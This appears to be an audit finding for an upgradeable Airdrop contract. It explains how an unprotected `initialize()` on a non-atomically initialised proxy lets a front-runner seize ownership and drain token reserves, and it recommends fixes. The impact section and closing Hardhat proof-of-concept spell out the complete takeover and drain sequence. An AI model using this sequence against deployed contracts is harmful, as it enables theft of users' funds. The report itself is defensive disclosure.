### Title
Unprotected `initialize()` on Airdrop Proxy Allows Front-Running to Seize Owner Role and Drain All Token Reserves — (`core/contracts/Airdrop.sol`)

---

### Summary

The `Airdrop` implementation contract calls `_disableInitializers()` in its constructor, which only locks the **implementation contract's own storage slot** (`_initialized = type(uint8).max`). The **proxy's** storage is entirely separate and starts with `_initialized = 0`. Because `initialize()` carries no caller restriction beyond the `initializer` modifier, any EOA can call it on the proxy before the legitimate deployer does, seize the `owner` role, and subsequently drain all airdrop token reserves.

---

### Finding Description

`Airdrop.sol` inherits `OwnableUpgradeable` and exposes an `external initializer` function with no access control:

```solidity
// core/contracts/Airdrop.sol
constructor() {
    _disableInitializers();   // protects implementation storage only
}

function initialize(address _token, address _sanctions)
    external
    initializer              // no msg.sender check
{
    __Ownable_init();        // sets owner = msg.sender
    token = _token;
    sanctions = _sanctions;
}
``` [1](#0-0) 

`_disableInitializers()` writes `_initialized = type(uint8).max` into the **implementation contract's** storage. When a `TransparentUpgradeableProxy` is deployed pointing to this implementation, the proxy has its own independent storage where `_initialized = 0`. The `initializer` modifier on the proxy's delegatecall context therefore passes for the first caller, regardless of who that caller is.

If the proxy is deployed without passing initialization calldata atomically (i.e., `_data = ""` in the `TransparentUpgradeableProxy` constructor), a window exists between proxy deployment and the legitimate `initialize()` call. An attacker who monitors the mempool can front-run that window.

The downstream functions that make this critical are:

```solidity
function registerMerkleRoot(uint32 week, bytes32 merkleRoot)
    external
    onlyOwner          // attacker now passes this
{ ... }
``` [2](#0-1) 

```solidity
function _claim(...) internal {
    _verifyProof(week, msg.sender, totalAmount, proof);
    SafeERC20.safeTransfer(IERC20(token), msg.sender, totalAmount);
}
``` [3](#0-2) 

`claim()` transfers `token` (set by the attacker in `initialize()`) to `msg.sender` after verifying a Merkle proof against `merkleRoots[week]` (set by the attacker via `registerMerkleRoot`). The attacker controls both sides of the proof.

---

### Impact Explanation

Complete theft of all airdrop token reserves held by the proxy. The attacker:
1. Becomes `owner` via `__Ownable_init()` in their `initialize()` call.
2. Sets `token` to the real airdrop token address (observable from the pending legitimate `initialize()` tx in the mempool).
3. Calls `registerMerkleRoot(1, craftedRoot)` where `craftedRoot` is the root of a single-leaf tree `keccak256(keccak256(abi.encode(attacker, contractBalance)))`.
4. Calls `claim([{week:1, totalAmount:contractBalance, proof:[]}])` — a single-leaf tree has an empty proof — transferring the entire token balance to themselves. [4](#0-3) 

---

### Likelihood Explanation

The precondition — proxy deployed without atomic initialization — is a realistic deployment scenario. The contract code provides zero on-chain enforcement that initialization must be atomic. Any deployment that separates proxy creation from the `initialize()` call (even by one block) is exploitable. On public networks with a visible mempool, a bot can detect the proxy deployment and submit a higher-gas `initialize()` call in the same block.

---

### Recommendation

**Option 1 (preferred):** Always deploy the proxy with initialization calldata passed atomically to the `TransparentUpgradeableProxy` constructor (`_data = abi.encodeCall(Airdrop.initialize, (token, sanctions))`), so no uninitialized window exists.

**Option 2 (defense-in-depth):** Add a caller restriction to `initialize()`:

```solidity
address private immutable _deployer;
constructor() {
    _deployer = msg.sender;
    _disableInitializers();
}

function initialize(address _token, address _sanctions)
    external
    initializer
{
    require(msg.sender == _deployer, "unauthorized");
    __Ownable_init();
    token = _token;
    sanctions = _sanctions;
}
```

Note: `immutable` variables are stored in bytecode and are accessible via delegatecall, making this pattern safe for upgradeable proxies.

### Proof of Concept

```solidity
// Hardhat test (pseudocode)
const Airdrop = await ethers.getContractFactory("Airdrop");
const impl = await Airdrop.deploy();

// Deploy proxy with empty _data — no atomic init
const ProxyFactory = await ethers.getContractFactory("TransparentUpgradeableProxy");
const proxy = await ProxyFactory.deploy(impl.address, proxyAdmin.address, "0x");

const airdrop = Airdrop.attach(proxy.address);

// Attacker front-runs initialize
await airdrop.connect(attacker).initialize(realToken.address, fakeSanctions.address);
assert((await airdrop.owner()) === attacker.address);  // attacker is owner

// Build single-leaf Merkle tree: leaf = keccak256(keccak256(abi.encode(attacker, balance)))
const balance = await realToken.balanceOf(proxy.address);
const leaf = ethers.utils.keccak256(
    ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(["address","uint256"], [attacker.address, balance])
    )
);
await airdrop.connect(attacker).registerMerkleRoot(1, leaf); // single-leaf root == leaf

await airdrop.connect(attacker).claim([{ week: 1, totalAmount: balance, proof: [] }]);
assert((await realToken.balanceOf(attacker.address)).eq(balance)); // all tokens drained
